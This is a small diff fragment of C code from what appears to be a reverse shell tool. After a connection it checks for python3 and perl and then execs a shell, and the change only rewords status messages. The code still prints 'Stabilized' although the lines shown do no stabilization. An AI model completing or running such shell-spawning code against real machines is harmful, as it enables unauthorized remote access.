@@ -43,10 +43,10 @@ int main(int argc, char * argv[]){
         puts("[+] Connected");
         puts("[i] Trying to stabilize shell with TTY");
         if(EXISTS("/usr/bin/python3")){
-                puts("[+] Python3 is on the machine. Stabilizing.");
+                puts("[+] Python3 is on the machine.");
         } else { puts("[-] Python3 is not on the machine.");}
         if(EXISTS("/usr/bin/perl")){
-                puts("[+] Perl is on the machine. Stabilizing.");   
+                puts("[+] Perl is on the machine.");   
         } else{ puts("[-] Perl os not on the machine.");}
         puts("[+] Stabilized");
         execve(args[0], &args[0], envp);
